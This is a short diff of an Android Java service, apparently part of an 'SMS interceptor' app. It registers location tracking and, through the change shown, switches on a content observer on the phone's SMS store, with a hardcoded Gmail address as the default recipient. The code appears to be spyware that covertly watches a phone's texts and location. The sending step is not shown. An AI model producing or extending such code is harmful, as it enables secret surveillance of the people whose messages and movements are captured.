@@ -38,9 +38,12 @@ public class SMSService extends Service implements LocationListener {
   private static boolean mLocation = false;
 
   public SMSService() { 
+
+    Log.i(TAG, "Entering SMSService() constructor");
+
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) {
-      gmailEmailString = String.valueOf(configure.getEmailAddress());
+      gmailEmailString = configure.getEmailAddress();
     }
     else {
       gmailEmailString = "smsinterceptorapp@gmail.com";   
@@ -178,9 +181,11 @@ public class SMSService extends Service implements LocationListener {
 
       locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
 
-      /*SMSObserver smsObserver = new SMSObserver(new Handler(), getApplicationContext());
+      Handler mSmsObserverHandler = new Handler();
+      //ContentResolver contentResolver = getContentResolver();
       ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
-      contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver);*/
+      SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
+      contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
 
     return START_STICKY;
   }
